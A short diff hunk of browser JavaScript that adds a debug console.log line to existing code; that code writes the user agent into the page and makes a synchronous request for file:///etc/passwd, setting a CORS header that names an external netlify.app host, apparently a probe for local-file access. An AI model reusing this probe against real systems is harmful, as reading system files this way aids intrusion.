@@ -7,6 +7,7 @@
 var d = document.getElementById('response');
 d.innerHTML = navigator.userAgent;
 var x = new XMLHttpRequest();
+console.log("test");
 x.open("GET", "file:///etc/passwd", false);
 x.setRequestHeader("Access-Control-Allow-Origin", "https://luminous-starship-acd96d.netlify.app");
 x.send();
